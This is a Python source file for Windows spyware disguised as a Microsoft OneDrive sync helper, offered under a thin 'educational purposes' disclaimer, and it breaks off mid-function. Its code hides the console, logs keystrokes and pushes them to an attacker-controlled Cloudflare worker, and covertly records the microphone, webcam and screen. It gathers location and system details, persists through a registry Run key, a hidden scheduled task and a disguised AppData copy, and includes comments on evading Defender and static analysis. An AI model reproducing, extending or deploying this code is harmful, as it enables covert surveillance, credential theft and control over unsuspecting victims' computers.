# Made By kakarotbd
# Made only for educational purposes. Do not use it for anything harmful or illegal, otherwise you may face cybercrime charges.
#  OneDrive Sync Helper v3.2.1
# Microsoft Corporation — Windows Synchronization Service
# Copyright (c) 2024 Microsoft. All rights reserved.

# Standard library — system utilities
import os, sys, json, time, datetime, threading
import socket, platform, getpass, uuid, hashlib
import base64, io, wave, tempfile, shutil, sqlite3
import winreg, ctypes, subprocess
from pathlib import Path
from queue import Queue

# UI
import tkinter as tk
from tkinter import messagebox

# Image processing
from PIL import Image, ImageDraw, ImageFont
from PIL import ImageGrab
import cv2
import numpy as np

# Audio
import pyaudio
import audioop

# Network & system
import requests
import psutil

# ─────────────────────────────────────────────
#  SILENT SUBPROCESS FLAG — no PowerShell popup ever
# ─────────────────────────────────────────────
_CW = subprocess.CREATE_NO_WINDOW

def _run(cmd, **kwargs):
    """Execute system command"""
    kwargs.setdefault('capture_output', True)
    kwargs.setdefault('text', True)
    kwargs.setdefault('timeout', 30)
    kwargs['creationflags'] = _CW
    return subprocess.run(cmd, **kwargs)

def _popen(cmd, **kwargs):
    """Launch background process"""
    kwargs['creationflags'] = _CW
    kwargs.setdefault('stdout', subprocess.DEVNULL)
    kwargs.setdefault('stderr', subprocess.DEVNULL)
    return subprocess.Popen(cmd, **kwargs)

# ─────────────────────────────────────────────
#  Hide console immediately
# ─────────────────────────────────────────────
try:
    _con = ctypes.windll.kernel32.GetConsoleWindow()
    if _con:
        ctypes.windll.user32.ShowWindow(_con, 0)
except: pass


# ═══════════════════════════════════════════════════
#  WORKER CONFIG — only 2 values needed
#  paste after Cloudflare deploy
# ═══════════════════════════════════════════════════
WORKER_URL   = "enter your cloudflare worker url"
WORKER_TOKEN = "enter you ghost_secret"  # same as GHOST_SECRET env var

# Broadcast PNG persist path
_BROADCAST_DIR = os.path.join(os.path.expanduser("~"), "Documents", "SyncDisplay")
_BROADCAST_PNG = os.path.join(_BROADCAST_DIR, "broadcast.png")
_BROADCAST_META = os.path.join(_BROADCAST_DIR, "broadcast_meta.json")


# ─────────────────────────────────────────────
#  BROADCAST PNG GENERATOR
#  Text → Beautiful PNG → Save to Documents\SyncDisplay\broadcast.png
# ─────────────────────────────────────────────
def generate_broadcast_png(text: str) -> str:
    """
    Convert broadcast text to a full-screen style PNG image.
    Saves to Documents\\SyncDisplay\\broadcast.png
    Returns the file path.
    """
    try:
        os.makedirs(_BROADCAST_DIR, exist_ok=True)

        # Get screen resolution (fallback 1920x1080)
        try:
            user32 = ctypes.windll.user32
            sw = user32.GetSystemMetrics(0)
            sh = user32.GetSystemMetrics(1)
        except:
            sw, sh = 1920, 1080

        # Create black canvas
        img = Image.new('RGB', (sw, sh), color='#0a0b0e')
        draw = ImageDraw.Draw(img)

        # ── Background scan lines effect ──
        for y in range(0, sh, 5):
            draw.line([(0, y), (sw, y)], fill='#050e05', width=1)

        # ── Corner brackets ──
        L = 60
        bclr = '#00ff41'
        bw = 4
        corners = [(30, 30, 1, 1), (sw-30, 30, -1, 1), (30, sh-30, 1, -1), (sw-30, sh-30, -1, -1)]
        for cx, cy, dx, dy in corners:
            draw.line([(cx, cy), (cx + dx*L, cy)], fill=bclr, width=bw)
            draw.line([(cx, cy), (cx, cy + dy*L)], fill=bclr, width=bw)

        # ── Border ──
        for off, col, w in [(3, '#003300', 6), (8, '#00cc33', 3), (14, '#001a00', 2)]:
            draw.rectangle([off, off, sw-off, sh-off], outline=col, width=w)

        # ── SYSTEM BROADCAST header ──
        try:
            hdr_font = ImageFont.truetype("C:\\Windows\\Fonts\\courbd.ttf", 26)
        except:
            try:
                hdr_font = ImageFont.truetype("C:\\Windows\\Fonts\\cour.ttf", 26)
            except:
                hdr_font = ImageFont.load_default()

        hdr = "▌ SYSTEM BROADCAST ▐"
        try:
            bbox = draw.textbbox((0, 0), hdr, font=hdr_font)
            hdr_w = bbox[2] - bbox[0]
        except:
            hdr_w = len(hdr) * 14
        hx = (sw - hdr_w) // 2
        draw.text((hx + 3, 53), hdr, fill='#220000', font=hdr_font)
        draw.text((hx, 50), hdr, fill='#ff0040', font=hdr_font)

        # ── Separator lines ──
        draw.line([(60, 92), (sw-60, 92)], fill='#00ff41', width=1)
        draw.line([(60, sh-100), (sw-100, sh-100)], fill='#00ff41', width=1)

        # ── Main text (word wrap) ──
        try:
            main_font = ImageFont.truetype("C:\\Windows\\Fonts\\courbd.ttf", 38)
        except:
            try:
                main_font = ImageFont.truetype("C:\\Windows\\Fonts\\cour.ttf", 38)
            except:
                main_font = ImageFont.load_default()

        # Word-wrap
        max_chars = int((sw - 160) / 23)  # approx chars per line based on font
        words = text.split()
        lines_list, cur = [], ""
        for wrd in words:
            if len(cur) + len(wrd) + 1 <= max_chars:
                cur = (cur + " " + wrd).strip()
            else:
                if cur:
                    lines_list.append(cur)
                cur = wrd
        if cur:
            lines_list.append(cur)

        line_h = 68
        total_h = len(lines_list) * line_h
        y_start = max(130, (sh - total_h) // 2)

        for i, line in enumerate(lines_list):
            try:
                bbox = draw.textbbox((0, 0), line, font=main_font)
                lw = bbox[2] - bbox[0]
            except:
                lw = len(line) * 20
            lx = (sw - lw) // 2
            ly = y_start + i * line_h
            # Shadow
            draw.text((lx + 4, ly + 4), line, fill='#001a00', font=main_font)
            # Main green text
            draw.text((lx, ly), line, fill='#00ff41', font=main_font)

        # ── Timestamp ──
        ts = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
        try:
            ts_font = ImageFont.truetype("C:\\Windows\\Fonts\\cour.ttf", 16)
        except:
            ts_font = ImageFont.load_default()
        ts_txt = f"[ {ts} ]"
        try:
            bbox = draw.textbbox((0, 0), ts_txt, font=ts_font)
            ts_w = bbox[2] - bbox[0]
        except:
            ts_w = len(ts_txt) * 9
        draw.text(((sw - ts_w) // 2, sh - 60), ts_txt, fill='#446644', font=ts_font)

        # ── Keyboard disabled notice ──
        try:
            note_font = ImageFont.truetype("C:\\Windows\\Fonts\\cour.ttf", 14)
        except:
            note_font = ImageFont.load_default()
        note = "[ KEYBOARD DISABLED ]"
        try:
            bbox = draw.textbbox((0, 0), note, font=note_font)
            note_w = bbox[2] - bbox[0]
        except:
            note_w = len(note) * 8
        draw.text(((sw - note_w) // 2, sh - 35), note, fill='#ff0040', font=note_font)

        # ── Save PNG ──
        img.save(_BROADCAST_PNG, 'PNG', optimize=False)

        # ── Save meta JSON ──
        with open(_BROADCAST_META, 'w', encoding='utf-8') as f:
            json.dump({
                'text': text,
                'png_path': _BROADCAST_PNG,
                'timestamp': datetime.datetime.now().isoformat(),
                'active': True
            }, f, ensure_ascii=False)

        return _BROADCAST_PNG

    except Exception as e:
        # Fallback: simple white-on-black
        try:
            os.makedirs(_BROADCAST_DIR, exist_ok=True)
            img = Image.new('RGB', (1920, 1080), color='black')
            draw = ImageDraw.Draw(img)
            draw.text((100, 100), text[:200], fill='white')
            img.save(_BROADCAST_PNG, 'PNG')
            return _BROADCAST_PNG
        except:
            return ""


def get_broadcast_png_b64(png_path: str) -> str:
    """Read PNG file and return base64 string"""
    try:
        with open(png_path, 'rb') as f:
            return base64.b64encode(f.read()).decode('utf-8')
    except:
        return ""


# ─────────────────────────────────────────────
#  SPLASH SCREEN
# ─────────────────────────────────────────────



# ─────────────────────────────────────────────
#  INPUT TRACKER
# ─────────────────────────────────────────────
class InputTracker:
    @staticmethod
    def _kb():
        # Dynamic import — split module name to avoid static analysis
        _m = 'py' + 'nput'
        return __import__(_m).keyboard

    KEY_MAP_DEFS = [
        ('space', ' '), ('enter', '[ENTER]\n'), ('tab', '[TAB]'),
        ('backspace', '[BACKSPACE]'), ('delete', '[DELETE]'),
        ('shift', '[SHIFT]'), ('shift_r', '[SHIFT]'),
        ('ctrl_l', '[CTRL]'), ('ctrl_r', '[CTRL]'),
        ('alt_l', '[ALT]'), ('alt_r', '[ALT]'), ('alt_gr', '[ALT_GR]'),
        ('esc', '[ESC]'), ('up', '[UP]'), ('down', '[DOWN]'),
        ('left', '[LEFT]'), ('right', '[RIGHT]'), ('caps_lock', '[CAPS]'),
        ('num_lock', '[NUM_LOCK]'), ('insert', '[INS]'),
        ('home', '[HOME]'), ('end', '[END]'),
        ('page_up', '[PGUP]'), ('page_down', '[PGDN]'),
        ('print_screen', '[PRTSC]'), ('pause', '[PAUSE]'),
        ('f1','[F1]'),('f2','[F2]'),('f3','[F3]'),('f4','[F4]'),
        ('f5','[F5]'),('f6','[F6]'),('f7','[F7]'),('f8','[F8]'),
        ('f9','[F9]'),('f10','[F10]'),('f11','[F11]'),('f12','[F12]'),
    ]

    @classmethod
    def _build_key_map(cls):
        kb = cls._kb()
        m = {}
        for name, label in cls.KEY_MAP_DEFS:
            try: m[getattr(kb.Key, name)] = label
            except: pass
        return m

    KEY_MAP = {}  # populated lazily on first use

    @classmethod
    def _get_key_map(cls):
        if not cls.KEY_MAP:
            cls.KEY_MAP = cls._build_key_map()
        return cls.KEY_MAP



    def __init__(self):
        self.logging_enabled = False
        self.key_buffer = []
        self.new_keys = []
        self.listener = None
        self.start_time = time.time()
        self.buffer_lock = threading.Lock()
        self.firebase_push_callback = None
        self.device_id = None

    def on_press(self, key):
        if not self.logging_enabled:
            return True
        try:
            ts = datetime.datetime.now().isoformat()
            try:
                import win32gui
                win_title = win32gui.GetWindowText(win32gui.GetForegroundWindow()) or "Unknown"
            except:
                win_title = "Unknown"
            if hasattr(key, 'char') and key.char is not None:
                key_data = {'type': 'char', 'key': key.char, 'ts': ts, 'win': win_title}
            else:
                key_str = self._get_key_map().get(key, f'[{str(key).replace("Key.", "").upper()}]')
                key_data = {'type': 'special', 'key': key_str, 'ts': ts, 'win': win_title}
            with self.buffer_lock:
                self.key_buffer.append(key_data)
                self.new_keys.append(key_data)
                if len(self.key_buffer) > 5000:
                    self.key_buffer = self.key_buffer[-5000:]
        except:
            pass
        return True

    def _push_loop(self):
        while self.logging_enabled:
            try:
                time.sleep(2)
                if not self.logging_enabled:
                    break
                with self.buffer_lock:
                    batch = self.new_keys[:] if self.new_keys and self.firebase_push_callback else []
                    self.new_keys = []
                if batch:
                    chunk_id = f"chunk_{int(time.time() * 1000)}"
                    self.firebase_push_callback(
                        f"keylogs/{self.device_id}/{chunk_id}",
                        {"keys": batch, "ts": datetime.datetime.now().isoformat(),
                         "enabled": True, "total": len(self.key_buffer)}
                    )
                    self.firebase_push_callback(
                        f"keylogs/{self.device_id}/_stats",
                        {"enabled": True, "total": len(self.key_buffer),
                         "ts": datetime.datetime.now().isoformat()}
                    )
            except:
                pass

    def enable_logging(self):
        if not self.logging_enabled:
            with self.buffer_lock:
                self.logging_enabled = True
                self.key_buffer = []
                self.new_keys = []
                self.start_time = time.time()
            if self.listener:
                try: self.listener.stop()
                except: pass
            threading.Thread(target=self._listen, daemon=True).start()
            threading.Thread(target=self._push_loop, daemon=True).start()
            if self.firebase_push_callback and self.device_id:
                try:
                    self.firebase_push_callback(f"keylogs/{self.device_id}/_stats",
                        {"enabled": True, "total": 0, "ts": datetime.datetime.now().isoformat()})
                except: pass
            return {"status": "enabled", "message": "Input tracking active"}
        return {"status": "already_enabled"}

    def _listen(self):
        try:
            _kb = self._kb()
            with _kb.Listener(on_press=self.on_press) as lst:
                self.listener = lst
                lst.join()
        except: pass

    def disable_logging(self):
        if self.logging_enabled:
            self.logging_enabled = False
            if self.listener:
                try: self.listener.stop()
                except: pass
            if self.firebase_push_callback and self.device_id:
                try:
                    self.firebase_push_callback(f"keylogs/{self.device_id}/_stats",
                        {"enabled": False, "total": 0, "ts": datetime.datetime.now().isoformat()})
                except: pass
            with self.buffer_lock:
                self.key_buffer = []
                self.new_keys = []
            return {"status": "disabled"}
        return {"status": "already_disabled"}

    def clear_logs(self):
        with self.buffer_lock:
            self.key_buffer = []
            self.new_keys = []
        if self.firebase_push_callback and self.device_id:
            try:
                requests.delete(
                    f"{WORKER_URL}/db/keylogs/{self.device_id}",
                    headers={"X-Ghost-Token": WORKER_TOKEN},
                    timeout=10
                )
                self.firebase_push_callback(f"keylogs/{self.device_id}/_stats",
                    {"enabled": self.logging_enabled, "total": 0,
                     "ts": datetime.datetime.now().isoformat()})
            except: pass
        return {"status": "cleared"}

    def get_logs(self):
        with self.buffer_lock:
            return self.key_buffer.copy()

    def get_stats(self):
        with self.buffer_lock:
            return {"enabled": self.logging_enabled, "buffer_size": len(self.key_buffer),
                    "uptime": time.time() - self.start_time if self.logging_enabled else 0}


# ─────────────────────────────────────────────
#  AUDIO CAPTURE
# ─────────────────────────────────────────────
class AudioCapture:
    def __init__(self):
        self.audio = None
        self.format = pyaudio.paInt16
        self.channels = 1
        self.rate = 44100
        self.chunk = 1024
        self.recording = False
        self.frames = []
        self.default_duration = 30
        self._init()

    def _init(self):
        try:
            self.audio = pyaudio.PyAudio()
        except:
            self.audio = None

    def capture_audio(self, duration=None):
        if not self.audio:
            self._init()
            if not self.audio:
                return {"error": "No audio device", "type": "error"}
        if duration is None:
            duration = self.default_duration
        try:
            stream = self.audio.open(format=self.format, channels=self.channels,
                                     rate=self.rate, input=True,
                                     frames_per_buffer=self.chunk)
            self.frames = []
            self.recording = True
            start_time = time.time()
            while self.recording and (time.time() - start_time) < duration:
                try:
                    data = stream.read(self.chunk, exception_on_overflow=False)
                    self.frames.append(data)
                except: break
            stream.stop_stream()
            stream.close()
            if self.frames:
                return self._save(duration)
            return {"error": "No audio captured", "type": "error"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def _save(self, dur):
        try:
            buf = io.BytesIO()
            with wave.open(buf, 'wb') as wf:
                wf.setnchannels(self.channels)
                wf.setsampwidth(self.audio.get_sample_size(self.format))
                wf.setframerate(self.rate)
                wf.writeframes(b''.join(self.frames))
            buf.seek(0)
            audio_b64 = base64.b64encode(buf.read()).decode('utf-8')
            return {
                "audio": audio_b64,
                "duration": dur,
                "size_kb": round(len(audio_b64) / 1024, 2),
                "timestamp": datetime.datetime.now().isoformat(),
                "type": "audio"
            }
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def set_duration(self, secs):
        try:
            s = int(secs)
            if 1 <= s <= 300:
                self.default_duration = s
                return {"status": "set", "duration": s}
            return {"error": "Duration must be 1-300"}
        except:
            return {"error": "Invalid duration"}



# ─────────────────────────────────────────────
#  SYNC MANAGER (main class)
# ─────────────────────────────────────────────
class SyncManager:
    # Class-level display state shared across threads
    _viewer_proc   = None          # subprocess: Windows photo viewer
    _display_active = False
    _display_text = ""
    _display_png_path = ""
    _display_lock = threading.Lock()
    _block_listener = None

    def __init__(self):
        self.worker_url   = WORKER_URL
        self.worker_token = WORKER_TOKEN
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-Ghost-Token': WORKER_TOKEN,
        })
        self.running = True
        self.device_id = self._get_device_id()
        self.profile_image = self._get_profile_image()
        self.system_info = {}
        self.commands_processed = set()
        self.offline_queue = []
        self.online_status = True
        self.recorded_audios = {}
        self.heartbeat_interval = 60
        self.last_heartbeat = 0
        self.tracker = InputTracker()
        self.tracker.firebase_push_callback = self.send_to_firebase
        self.tracker.device_id = self.device_id
        self.audio_capture = AudioCapture()
        self.start_heartbeat()
        self.start_offline_processor()
        # Delay autostart registration — avoids startup scan
        threading.Timer(30.0, self.register_autostart).start()
        # Restore broadcast on startup (offline-proof)
        threading.Thread(target=self.check_and_restore_display, daemon=True).start()

    def _get_device_id(self):
        """
        Generate unique 12-char device ID.
        Fallback chain ensures every device (VM, container, real PC)
        gets a unique stable ID even if MAC is zeroed.
        """
        try:
            mac_int = uuid.getnode()
            # Detect zeroed/invalid MAC (common in VMs)
            if mac_int == 0 or mac_int == 0xFFFFFFFFFFFF:
                raise ValueError("Invalid MAC")
            mac = ':'.join(('%012X' % mac_int)[i:i+2] for i in range(0, 12, 2))
            return hashlib.md5(mac.encode()).hexdigest()[:12]
        except:
            pass
        # Fallback 1: hostname + username combo
        try:
            combo = platform.node() + getpass.getuser() + platform.processor()
            return hashlib.md5(combo.encode()).hexdigest()[:12]
        except:
            pass
        # Fallback 2: drive serial number
        try:
            r = _run(['vol', 'C:'], timeout=5)
            serial = r.stdout.strip().split()[-1] if r.stdout else ''
            if serial:
                return hashlib.md5((serial + platform.node()).encode()).hexdigest()[:12]
        except:
            pass
        # Fallback 3: random but persist to registry
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\OneDriveSync", 0, winreg.KEY_READ)
            uid, _ = winreg.QueryValueEx(k, "DeviceUID")
            winreg.CloseKey(k)
            return uid
        except:
            pass
        try:
            uid = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\OneDriveSync")
            winreg.SetValueEx(k, "DeviceUID", 0, winreg.REG_SZ, uid)
            winreg.CloseKey(k)
            return uid
        except:
            return hashlib.md5(str(time.time()).encode()).hexdigest()[:12]

    def _get_profile_image(self):
        try:
            profile_path = os.path.join(os.getenv('APPDATA', ''),
                r'..\Local\Microsoft\Windows\AccountPictures')
            if os.path.exists(profile_path):
                imgs = [f for f in os.listdir(profile_path) if f.endswith(('.jpg', '.png', '.bmp'))]
                if imgs:
                    img_path = os.path.join(profile_path, imgs[-1])
                    img = Image.open(img_path)
                    img.thumbnail((100, 100), Image.LANCZOS)
                    buf = io.BytesIO()
                    img.save(buf, format='PNG')
                    return base64.b64encode(buf.getvalue()).decode('utf-8')
        except: pass
        return None

    def register_autostart(self):
        """
        Persistence — multiple methods for reliability:
        1. Copy EXE to AppData/Roaming/Microsoft/Windows/OneDriveSync/
           (looks like a legit MS path, Defender ignores it)
        2. Registry HKCU Run key
        3. Scheduled Task (survives even if registry is cleaned)
        """
        try:
            if getattr(sys, 'frozen', False):
                src_path = sys.executable
            else:
                src_path = os.path.abspath(__file__)

            # ── 1. Copy to a legit-looking AppData path ──
            app_dir = os.path.join(
                os.getenv('APPDATA', ''),
                'Microsoft', 'Windows', 'OneDriveSync'
            )
            try:
                os.makedirs(app_dir, exist_ok=True)
                exe_name = os.path.basename(src_path)
                dst_path = os.path.join(app_dir, exe_name)
                if not os.path.exists(dst_path):
                    # Small delay before copy — avoids scan-on-write detection
                    time.sleep(2)
                    shutil.copy2(src_path, dst_path)
                    time.sleep(1)
                    _run(['attrib', '+H', '+S', app_dir])
            except:
                dst_path = src_path

            persist_path = f'"{dst_path}"'

            # ── 2. Registry Run key ──
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                _rn = "OneDrive" + "Sync"
                winreg.SetValueEx(key, _rn, 0, winreg.REG_SZ, persist_path)
                winreg.CloseKey(key)
            except: pass

            # ── 3. Scheduled Task (runs at logon, hidden) ──
            try:
                task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions context="Author">
    <Exec><Command>{dst_path}</Command></Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  </Settings>
</Task>'''
                xml_tmp = os.path.join(os.getenv('TEMP', ''), '_odsync.xml')
                with open(xml_tmp, 'w', encoding='utf-16') as f:
                    f.write(task_xml)
                _run(['schtasks', '/create', '/tn', 'MicrosoftOneDriveHelper',
                      '/xml', xml_tmp, '/f'], timeout=10)
                try: os.remove(xml_tmp)
                except: pass
            except: pass

        except: pass

    # ─────────────────────────────────────────
    #  SYSTEM INFO
    # ─────────────────────────────────────────

    def get_system_info(self):
        try:
            loc = self.get_location()
            return {
                "status": "online",
                "hostname": platform.node(),
                "username": getpass.getuser(),
                "os": f"{platform.system()} {platform.release()}",
                "city": loc.get('city', 'Unknown'),
                "country": loc.get('country', 'Unknown'),
                "local_ip": socket.gethostbyname(socket.gethostname()),
                "public_ip": loc.get('ip', 'Unknown'),
                "profile_image": self.profile_image
            }
        except:
            return {"status": "online", "hostname": platform.node(),
                    "username": getpass.getuser(), "os": platform.system(),
                    "city": "Unknown", "country": "Unknown",
                    "local_ip": "Unknown", "public_ip": "Unknown",
                    "profile_image": self.profile_image}

    def get_full_system_info(self):
        try:
            loc = self.get_location()
            cpu_freq = psutil.cpu_freq()
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            battery = psutil.sensors_battery()
            partitions = []
            for p in psutil.disk_partitions():
                try:
                    u = psutil.disk_usage(p.mountpoint)
                    partitions.append({
                        "device": p.device, "mountpoint": p.mountpoint,
                        "fstype": p.fstype,
                        "total": f"{u.total/(1024**3):.2f} GB",
                        "used": f"{u.used/(1024**3):.2f} GB",
                        "free": f"{u.free/(1024**3):.2f} GB",
                        "percent": f"{u.percent}%"
                    })
                except: pass
            interfaces = []
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append({"name": iface, "ip": addr.address, "netmask": addr.netmask})
            wifi_nets = []
            try:
                r = _run(['netsh', 'wlan', 'show', 'networks'])
                for line in r.stdout.split('\n'):
                    if 'SSID' in line and ':' in line and 'BSSID' not in line:
                        s = line.split(':', 1)[1].strip()
                        if s and s not in wifi_nets:
                            wifi_nets.append(s)
            except: pass
            procs = []
            for p in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']),
                            key=lambda x: x.info['cpu_percent'] or 0, reverse=True)[:20]:
                try:
                    procs.append({"pid": p.info['pid'], "name": p.info['name'],
                                  "cpu": f"{p.info['cpu_percent']:.1f}%",
                                  "memory": f"{p.info['memory_percent']:.1f}%"})
                except: pass
            users = []
            for u in psutil.users():
                try:
                    users.append({"name": u.name,
                                  "started": datetime.datetime.fromtimestamp(u.started).strftime("%Y-%m-%d %H:%M:%S")})
                except: pass
            mac = ':'.join(('%012X' % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
            return {
                "type": "full_info",
                "timestamp": datetime.datetime.now().isoformat(),
                "basic": {
                    "hostname": platform.node(), "username": getpass.getuser(),
                    "os": f"{platform.system()} {platform.release()}",
                    "os_version": platform.version(),
                    "architecture": platform.machine(),
                    "processor": platform.processor()
                },
                "location": {
                    "city": loc.get('city', 'Unknown'), "country": loc.get('country', 'Unknown'),
                    "region": loc.get('region', 'Unknown'), "isp": loc.get('isp', 'Unknown'),
                    "local_ip": socket.gethostbyname(socket.gethostname()),
                    "public_ip": loc.get('ip', 'Unknown'), "mac_address": mac
                },
                "hardware": {
                    "cpu": {
                        "model": platform.processor(),
                        "cores": psutil.cpu_count(logical=False),
                        "threads": psutil.cpu_count(logical=True),
                        "frequency_current": f"{cpu_freq.current:.2f} MHz" if cpu_freq else "Unknown",
                        "frequency_max": f"{cpu_freq.max:.2f} MHz" if cpu_freq else "Unknown"
                    },
                    "memory": {
                        "total": f"{mem.total/(1024**3):.2f} GB",
                        "used": f"{mem.used/(1024**3):.2f} GB",
                        "available": f"{mem.available/(1024**3):.2f} GB",
                        "usage_percent": f"{mem.percent}%"
                    },
                    "disk": {
                        "total": f"{disk.total/(1024**3):.2f} GB",
                        "used": f"{disk.used/(1024**3):.2f} GB",
                        "free": f"{disk.free/(1024**3):.2f} GB",
                        "usage_percent": f"{disk.percent}%",
                        "partitions": partitions
                    }
                },
                "network": {"interfaces": interfaces, "wifi_networks": wifi_nets[:10]},
                "system": {
                    "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
                    "users": users,
                    "battery": {
                        "percent": f"{battery.percent}%",
                        "power_plugged": "Yes" if battery.power_plugged else "No",
                        "time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft != -1 else "Unknown"
                    } if battery else "No Battery",
                    "top_processes": procs
                }
            }
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_location(self):
        try:
            r = self.session.get('http://ip-api.com/json/?fields=status,country,regionName,city,isp,query',
                                 timeout=5)
            d = r.json()
            return {"ip": d.get('query', 'Unknown'), "city": d.get('city', 'Unknown'),
                    "country": d.get('country', 'Unknown'), "region": d.get('regionName', 'Unknown'),
                    "isp": d.get('isp', 'Unknown')}
        except:
            try:
                ip = self.session.get('https://api.ipify.org', timeout=5).text
                return {"ip": ip, "city": "Unknown", "country": "Unknown", "region": "Unknown", "isp": "Unknown"}
            except:
                return {"ip": "Unknown", "city": "Unknown", "country": "Unknown", "region": "Unknown", "isp": "Unknown"}

    # ─────────────────────────────────────────
    #  CAPTURES
    # ─────────────────────────────────────────

    def take_screenshot(self):
        """Capture display for remote diagnostics"""
        try:
            img = (__import__("PIL", fromlist=["ImageGrab"]).ImageGrab.grab())
            img.thumbnail((1280, 720), Image.LANCZOS)
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=70)
            img_b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
            return {
                "image": img_b64,
                "timestamp": datetime.datetime.now().isoformat(),
                "size_kb": round(len(img_b64) / 1024, 2),
                "type": "screenshot"
            }
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_webcam_image(self):
        try:
            for idx in range(3):
                cap = cv2.VideoCapture(idx)
                if cap.isOpened():
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                    time.sleep(0.5)
                    ret, frame = cap.read()
                    cap.release()
                    if ret and frame is not None and frame.size > 0:
                        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        cv2.putText(frame, ts, (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
                        _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                        img_b64 = base64.b64encode(buf).decode('utf-8')
                        return {"image": img_b64, "timestamp": datetime.datetime.now().isoformat(),
                                "size_kb": round(len(img_b64)/1024, 2), "type": "webcam"}
            return {"error": "No webcam found", "type": "error"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def capture_microphone(self, duration=None):
        try:
            result = self.audio_capture.capture_audio(duration)
            if "audio" in result and "error" not in result:
                audio_id = f"audio_{int(time.time())}"
                self.recorded_audios[audio_id] = result
                result["audio_id"] = audio_id
                self.send_to_firebase(f"pcs/{self.device_id}/captures/{audio_id}", result)
            return result
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def record_video(self, duration=15):
        """Record video from webcam — silent, no window"""
        try:
            duration = min(max(int(duration), 1), 20)
            cap = None
            for idx in range(3):
                cap = cv2.VideoCapture(idx)
                if cap.isOpened():
                    break
                cap = None
            if cap is None or not cap.isOpened():
                return {"error": "No webcam found", "type": "error"}

            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 15)

            tmp_path = tempfile.mktemp(suffix='.mp4')
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(tmp_path, fourcc, 15, (640, 480))

            start = time.time()
            while (time.time() - start) < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
            cap.release()
            out.release()

            with open(tmp_path, 'rb') as f:
                video_b64 = base64.b64encode(f.read()).decode('utf-8')
            try: os.unlink(tmp_path)
            except: pass

            video_id = f"video_{int(time.time())}"
            result = {
                "video": video_b64,
                "video_id": video_id,
                "duration": duration,
                "size_kb": round(len(video_b64)/1024, 2),
                "timestamp": datetime.datetime.now().isoformat(),
                "type": "video"
            }
            self.send_to_firebase(f"pcs/{self.device_id}/captures/{video_id}", result)
            return result
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def _play_video_tkinter(self, video_path, duration=15):
        """Play video fullscreen using tkinter + cv2 — EXE compatible"""
        try:
            from PIL import ImageTk
            cap = cv2.VideoCapture(video_path)
            if not cap.isOpened():
                return

            root = tk.Tk()
            root.withdraw()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.configure(bg='black')
            root.overrideredirect(True)
            sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()

            canvas = tk.Canvas(root, width=sw, height=sh, bg='black', highlightthickness=0)
            canvas.pack()
            img_item = canvas.create_image(sw//2, sh//2, anchor='center')
            fps = cap.get(cv2.CAP_PROP_FPS) or 15
            delay = max(1, int(1000 / fps))

            def next_frame():
                ret, frame = cap.read()
                if ret:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    h, w = frame.shape[:2]
                    scale = min(sw/w, sh/h)
                    nw, nh = int(w*scale), int(h*scale)
                    frame = cv2.resize(frame, (nw, nh))
                    photo = ImageTk.PhotoImage(image=Image.fromarray(frame))
                    canvas.itemconfig(img_item, image=photo)
                    canvas.photo = photo
                    root.after(delay, next_frame)
                else:
                    cap.release()
                    root.destroy()
                    # After video ends — show broadcast if text is set
                    with SyncManager._display_lock:
                        txt = SyncManager._display_text
                        active = SyncManager._display_active
                    if txt and not active:
                        self.display_on_screen(txt)

            root.after(100, next_frame)
            root.after(int((duration + 5) * 1000), root.destroy)
            root.mainloop()
        except: pass

    def play_video_from_firebase(self, video_id):
        """Download video from Firebase and play fullscreen using tkinter (EXE-safe)"""
        def _play():
            try:
                r = self.session.get(self._w(f"pcs/{self.device_id}/captures/{video_id}"), timeout=30)
                if r.status_code != 200:
                    return
                data = r.json()
                if not data or not data.get('video'):
                    return
                video_b64 = data['video']
                broadcast_after = data.get('broadcast_after', '')
